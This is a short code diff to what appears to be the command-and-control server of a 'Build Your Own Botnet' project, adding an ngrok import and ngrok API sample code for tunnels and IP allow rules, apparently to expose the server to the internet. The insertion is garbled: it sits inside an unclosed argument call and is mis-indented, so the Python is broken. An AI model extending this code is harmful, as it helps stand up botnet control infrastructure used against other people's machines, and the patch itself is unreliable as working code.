@@ -18,6 +18,8 @@ import datetime
 import threading
 import subprocess
 import collections
+import ngrok
+
 
 # modules
 import core.util as util
@@ -66,12 +68,27 @@ def main():
         description="Command & Control Server (Build Your Own Botnet)"
     )
 
+
     parser.add_argument(
         '--host',
         action='store',
         type=str,
         default='0.0.0.0',
         help='server hostname or IP address')
+
+parser.add_argument(
+'--ngrok',
+# construct the api client
+ng = ngrok.Client("<API KEY>")
+
+# list all online tunnels
+for t in ng.tunnels():
+    print(t)
+
+# create an ip policy the allows traffic from some subnets
+policy = ng.ip_policies.create(action="allow")
+for cidr in ["24.0.0.0/8", "12.0.0.0/8"]:
+    ng.ip_policy_rules.create(cidr=cidr, ip_policy_id=policy.id)
 
     parser.add_argument(
         '--port',
